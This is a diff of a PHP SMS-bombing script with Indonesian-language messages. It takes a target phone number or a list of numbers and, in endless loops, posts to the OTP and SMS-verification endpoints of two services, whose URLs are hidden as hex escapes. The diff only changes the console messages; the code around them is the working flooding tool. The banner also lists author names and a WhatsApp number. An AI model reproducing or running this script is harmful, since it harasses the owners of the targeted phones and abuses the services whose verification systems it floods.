@@ -140,11 +140,11 @@ echo $G."\n- Dicky";
 
 echo $G."\n- Iza";
 
-echo $GG."\n- Naufal";
+echo $G."\n- Naufal";
 
-echo $GG."\n- Niko";
+echo $G."\n- Niko";
 
-echo $GG."\n- Zaky";
+echo $G."\n- Zaky";
 
 echo $G."\nWhatsapp: 0823-1622-6095";
 
@@ -154,13 +154,13 @@ isset($argv[1]) OR die($G."ERROR: SILAHKAN MASUKAN NOMOR HP TARGER\n".$X);
 
 if(is_numeric($argv[1])) {
 
-	echo "[]Prossesing Spam SmS[] #".$G.$argv[1].$X."\n";
+	echo "INFORMATION: SEDANG DIPROSES".$G.$argv[1].$X."\n";
 
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[1]."&accept=call");
 
 	while(1) {
 
-		echo "[]SIL3NT Sending Massage To[] # ".$G.$argv[1].$X."\n";	
+		echo "SUCCESSFULLY: SMS DIKIRIM KE NOMOR".$G.$argv[1].$X."\n";	
 
 		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[1]."&smsType=1");
 
@@ -172,7 +172,7 @@ if(is_numeric($argv[1])) {
 
 if(!file_exists($argv[1])) {
 
-	die($RR."[!] File Not Exists [!]".$X."\n");
+	die($G."ERROR: FILE TIDAK ADA!".$X."\n");
 
 }
 
@@ -182,7 +182,7 @@ $argv[1]=str_replace(' ','',$argv[1]);
 
 foreach($argv[1] as $argv[2]):
 
-echo "[]Prossessing spam sms[] #".$G.$argv[2].$X."\n";
+echo "INFORMATION: SEDANG MEMPROSES".$G.$argv[2].$X."\n";
 
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[2]."&accept=call");
 
@@ -192,7 +192,7 @@ while(1) {
 
 foreach($argv[1] as $argv[2]):
 
-echo "[]SIL3NT Sending Massage To[] # ".$G.$argv[2].$X."\n";
+echo "SUCCESSFULLY: SMS DIKIRIM KE NOMOR".$G.$argv[2].$X."\n";
 
 	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[2]."&smsType=1");
 
